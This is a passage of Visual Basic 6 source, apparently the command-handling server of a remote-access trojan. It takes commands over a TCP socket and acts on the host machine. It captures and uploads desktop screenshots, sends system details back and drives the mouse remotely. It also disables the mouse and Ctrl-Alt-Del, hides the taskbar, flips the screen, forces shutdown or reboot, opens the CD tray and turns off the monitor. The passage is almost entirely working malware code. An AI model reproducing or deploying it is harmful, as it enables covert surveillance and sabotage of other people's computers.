hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0&)
'on error
If hSnapShot = 0 Then Exit Sub
'prepare for API call
uProcess.dwSize = Len(uProcess)
'get first program
r = Process32First(hSnapShot, uProcess)
'loop while progs are still being found
Do While r
 lblTemp.Caption = Trim(LCase(uProcess.szExeFile))
 'if process path same
 If lblTemp.Caption = LCase(Trim(Info(0))) And CLng(Trim(Info(2))) = uProcess.th32ProcessID Then
    Call SetPriority(uProcess.th32ProcessID, CLng(Trim(Info(1))))
    Exit Do
 End If
 'get next program
 r = Process32Next(hSnapShot, uProcess)
Loop
'close handle to free resource
CloseHandle hSnapShot

Info(0) = ""
Info(1) = ""
Info(2) = ""
lblTemp.Caption = ""
End Sub

'Function 18
Private Sub AllowMouseClick_18(DATA As String)
StringTokenizer DATA

Select Case Info(4)
    Case "1" 'left click
         If Info(0) <> Info(2) Then 'drap & drop
            Call SetCursorPos(Int(Val(Info(0)) * GetScreenX), Int(Val(Info(1)) * GetScreenY))
            Sleep 250
            mouse_event 2, 0, 0, 0, 0
            Call SetCursorPos(Int(Val(Info(2)) * GetScreenX), Int(Val(Info(3)) * GetScreenY))
            Sleep 250
            mouse_event 4, 0, 0, 0, 0
         Else
            Call SetCursorPos(Int(Val(Info(2)) * GetScreenX), Int(Val(Info(3)) * GetScreenY))
            Sleep 250
            mouse_event 2, 0, 0, 0, 0
            mouse_event 4, 0, 0, 0, 0
         End If
         
    Case "2" 'right click
         Call SetCursorPos(Int(Val(Info(2)) * GetScreenX), Int(Val(Info(3)) * GetScreenY))
         Sleep 250
         mouse_event 8, 0, 0, 0, 0
         mouse_event 16, 0, 0, 0, 0
    
    Case "3" 'double click
         Call SetCursorPos(Int(Val(Info(2)) * GetScreenX), Int(Val(Info(3)) * GetScreenY))
         Sleep 250
         mouse_event 2, 0, 0, 0, 0
         mouse_event 4, 0, 0, 0, 0
         
         mouse_event 2, 0, 0, 0, 0
         mouse_event 4, 0, 0, 0, 0
    
End Select

Info(0) = ""
Info(1) = ""
Info(2) = ""
Info(3) = ""
Info(4) = ""
End Sub

Private Sub FullScreenCapture_18()
Dim DeskhWnd, DeskDC As Long
Dim fPic As String

fPic = Get_WinPath & "desktop.jpg"
'Get the hWnd of the desktop
DeskhWnd = GetDesktopWindow()
'BitBlt needs the DC to copy the image. So, we
'need the GetDC API.
DeskDC = GetDC(DeskhWnd)
'capture the screen
BitBlt Me.hdc, 0&, 0&, Screen.Width, Screen.Height, DeskDC, 0&, 0&, SRCCOPY
SavePicture Me.Image, fPic
DoEvents
Picture1.Picture = LoadPicture(fPic)
DoEvents
Call SavePic
DoEvents
Me.Cls
Call DownloadFile(fPic)
DoEvents
If FileExists(fPic) Then Kill fPic
End Sub

Private Sub SavePic()
Dim sI As String
Dim c As New cDIBSection

   Set c = New cDIBSection
   c.CreateFromPicture Picture1.Picture
   
   sI = Get_WinPath & "desktop.jpg"
   If FileExists(sI) Then Kill sI
   
   Call SaveJPG(c, sI, 65)
End Sub

'Function 19
Public Sub FlipScreen_19(cmd As Integer)
Dim fliphorizontal As Boolean
Dim flipvertical As Boolean

Select Case cmd
    Case 0 'flip vertically
         fliphorizontal = False
         flipvertical = True
    Case 1 'flip horizontally
         fliphorizontal = True
         flipvertical = False
End Select
Call InitialFlip
frmSCR.Picture1.Cls 'Clear picture
DumpToWindow frmSCR.Picture1, SRCCOPY, fliphorizontal, flipvertical
frmSCR.Show 'show the form
End Sub

Private Sub InitialFlip()
With frmSCR 'set the size of the form and picture in it
.Top = 0
.Left = 0
.Width = Screen.Width
.Height = Screen.Height
.Picture1.Height = Screen.Height
.Picture1.Width = Screen.Width
End With
End Sub

'Function 21
Private Sub RefreshResolution_21()
Dim i As Integer
Dim P As String
    
    Call RefreshResolution
    For i = 0 To (List1.ListCount - 1)
        P = P & List1.List(i) & Delimiter
    Next
    TCPServer.sckSendData P
    List1.Clear
End Sub

'Function 22
Private Sub ChangeColor(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)

  Call SetSysColors(1, COLOR_MENU, CLng(Info(0)))
  Call SetSysColors(1, COLOR_BTNFACE, CLng(Info(1)))
  Call SetSysColors(1, COLOR_BACKGROUND, CLng(Info(2)))
  Call SetSysColors(1, COLOR_WINDOWTEXT, CLng(Info(3)))
  
For i = 0 To i
    Info(i) = ""
Next i
End Sub

'Function 24
Private Sub SaveSettings_24(DATA As String)
Dim i As Integer
Dim AppName, FileName As String

AppName = "Screen Saver.3DText"
FileName = "CONTROL.INI"

i = StringTokenizer(DATA)

'this is original step
SaveProfile AppName & "", "DemoType", 0, FileName
SaveProfile AppName & "", "RotStyle", Info(4), FileName
SaveProfile AppName & "", "Tesselation", Info(5), FileName
SaveProfile AppName & "", "Size", Info(2), FileName
SaveProfile AppName & "", "Speed", Info(6), FileName
SaveProfile AppName & "", "SurfStyle", 0, FileName
SaveProfile AppName & "", "Font", Info(1), FileName
SaveProfile AppName & "", "FontAttributes", Info(3), FileName
SaveProfile AppName & "", "CharSet", 0, FileName
SaveProfile AppName & "", "Text", Info(0), FileName
SaveProfile AppName & "", "Texture", " ", FileName
SaveProfile AppName & "", "TextureFileOffset", 0, FileName

For i = 0 To i
    Info(i) = ""
Next i
End Sub

'Function 25
Private Sub RestartWin_25(cmd As Integer)
Select Case cmd
    Case 0 'normal shut down
         Call ExitWindowsEx(EWX_SHUTDOWN, 0)
    Case 1 'force shut down
         Call ExitWindowsEx(EWX_FORCE + 1, 0)
    Case 2 'log off
         Call ExitWindowsEx(EWX_LOGOFF, 0)
    Case 3 'restart
         Call ExitWindowsEx(EWX_REBOOT, 0)
    Case 4 'force restart
         Call ExitWindowsEx(EWX_FORCE + 2, 0)
End Select
End Sub

'Function 26
Private Sub Mouse_26(cmd As Integer, Value As String)
Select Case cmd
    Case 0 'set double click time
         Call SetDoubleClickTime(CLng(Value))
    Case 1 'reverse buttons
         Call SwapMouseButton(True)
    Case 2 'restore buttons
         Call SwapMouseButton(False)
    Case 3 'hide mouse
         Call HideMouse
    Case 4 'show mouse
         Call ShowMouse
    Case 6 'stop move/control
         txtAction.Text = ""
    Case 7 'disable mouse
         Shell "rundll32 mouse,disable"
End Select
End Sub

Private Sub controlMouse_26(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)
Call SetCursorPos(Int(Val(Info(0)) * GetScreenX), Int(Val(Info(1)) * GetScreenY))
DoEvents
For i = 0 To i
    Info(i) = ""
Next i
End Sub

Private Sub HideMouse()
Dim NewRect As RECT

With NewRect
     .Left = -1000
     .Top = -1000
     .Right = -1000
     .Bottom = -1000
End With

Call ClipCursor(NewRect)
Call SetCursorPos(-48, -48)
End Sub

Private Sub ShowMouse()
Dim NewRect As RECT
Dim x, y As Long

With NewRect
  .Left = 0
  .Top = 0
  .Right = Screen.Width / Screen.TwipsPerPixelX
  .Bottom = Screen.Height / Screen.TwipsPerPixelY
End With

Call ClipCursor(NewRect)
x = (Screen.Width / Screen.TwipsPerPixelX) / 2
y = (Screen.Height / Screen.TwipsPerPixelY) / 2
Call SetCursorPos(x, y)
End Sub

'Function 27
Private Sub Sound_27(cmd As Integer, Value As Long)
Dim ok As Boolean              'boolean return code
Dim mute As MIXERCONTROL
Dim unmute As MIXERCONTROL

'get mixer handle & MIXERCONTROL
Call ReadSoundSetting_27

Select Case cmd
    Case 0
         SetVolumeControl hmixer, VolCtrl, Value
    Case 1
         SetVolumeControl hmixer, WavCtrl, Value
    Case 2
         SetVolumeControl hmixer, CDVol, Value
    Case 3 'to mute
         ok = GetMixerControl(hmixer, MIXERLINE_COMPONENTTYPE_DST_SPEAKERS, _
              MIXERCONTROL_CONTROLTYPE_MUTE, unmute)
         unSetMuteControl hmixer, unmute, 1
    Case 4 'to unmute
         ok = GetMixerControl(hmixer, MIXERLINE_COMPONENTTYPE_DST_SPEAKERS, _
              MIXERCONTROL_CONTROLTYPE_MUTE, mute)
         SetMuteControl hmixer, mute, 1
End Select
End Sub

Function ReadSoundSetting_27() As String
Dim P As String
Dim rc As Long                 'return code
Dim ok As Boolean              'boolean return code
Dim volume As Long

    'Open the mixer with deviceID 0.
    rc = mixerOpen(hmixer, 0, 0, 0, 0)
    If ((MMSYSERR_NOERROR <> rc)) Then
        'Couldn't open the mixer
        Exit Function
    End If
     
    ok = GetMixerControl(hmixer, MIXERLINE_COMPONENTTYPE_DST_SPEAKERS, _
                                  MIXERCONTROL_CONTROLTYPE_VOLUME, VolCtrl)
    If (ok = True) Then
       volume = GetVolumeControlValue(hmixer, VolCtrl)
       If volume <> -1 Then
          P = volume & Delimiter
       End If
    End If
    
    ok = GetMixerControl(hmixer, MIXERLINE_COMPONENTTYPE_SRC_WAVEDSVol, _
                                  MIXERCONTROL_CONTROLTYPE_VOLUME, WavCtrl)
    If (ok = True) Then
       volume = GetVolumeControlValue(hmixer, WavCtrl)
       If volume <> -1 Then
          P = P & volume & Delimiter
       End If
    End If
    
    ok = GetMixerControl(hmixer, MIXERLINE_COMPONENTTYPE_SRC_CDVol, _
                                  MIXERCONTROL_CONTROLTYPE_VOLUME, CDVol)
    If (ok = True) Then
       volume = GetVolumeControlValue(hmixer, CDVol)
       If volume <> -1 Then
          P = P & volume & Delimiter
       End If
    End If
    'TCPServer.sckSendData P
    ReadSoundSetting_27 = P
End Function

'Function 28
Private Sub GetTimeDate_28()
Dim P, hr, min, ap As String

hr = Format(Time, "hh")
If Int(hr) = 0 Then
   hr = 12
ElseIf Int(hr) >= 13 And Int(hr) <= 23 Then
   hr = hr - 12
End If
min = Format(Time, "nn")
ap = Right(Time, 2)

P = hr & Delimiter & min & Delimiter & ap & Delimiter & Format(Now, "DD/MM/YYYY") & Delimiter
TCPServer.sckSendData (P)
End Sub

Private Sub SetTimeDate_28(DATA As String)
Dim i, hr As Integer
Dim P As String

i = StringTokenizer(DATA)

Select Case Int(Info(0))
    Case 0 'set time
         Call SetTime(Info(1) & ":" & Info(2) & " " & Info(3))
    Case 1 'set date
         Call SetDate(Info(1))
End Select

For i = 0 To i 'clear
    Info(i) = ""
Next
End Sub

Public Sub SetDate(NewDate As Variant)
On Error GoTo errDate
DateTime.Date = Format(NewDate, "DD/MM/YYYY")
Exit Sub
errDate:
Exit Sub
End Sub

Public Sub SetTime(NewTime As Variant)
On Error GoTo errTime
DateTime.Time = NewTime
Exit Sub
errTime:
Exit Sub
End Sub

'Function 29
Private Sub Extra_29(Command As Integer)
Select Case Command
    Case 0
         Call Desktop_Hide
    Case 1
         Call Desktop_Show
    Case 2
         Call StartButton_Hide
    Case 3
         Call StartButton_Show
    Case 4
         Call Taskbar_Hide
    Case 5
         Call Taskbar_Show
    Case 6
         Call CDROM_Open
    Case 7
         Call CDROM_Close
    Case 8
         Call Speaker_Start
    Case 9
         Call Speaker_Stop
    Case 10
         Call Monitor_On
    Case 11
         Call Monitor_Off
    Case 12
         Call CtrlAltDel_On
    Case 13
         Call CtrlAltDel_Off
    Case 14
         Call ScrollLock_On
    Case 15
         Call ScrollLock_Off
    Case 16
         Call CapsLock_On
    Case 17
         Call CapsLock_Off
    Case 18
         Call NumLock_On
    Case 19
         Call NumLock_Off
End Select
End Sub
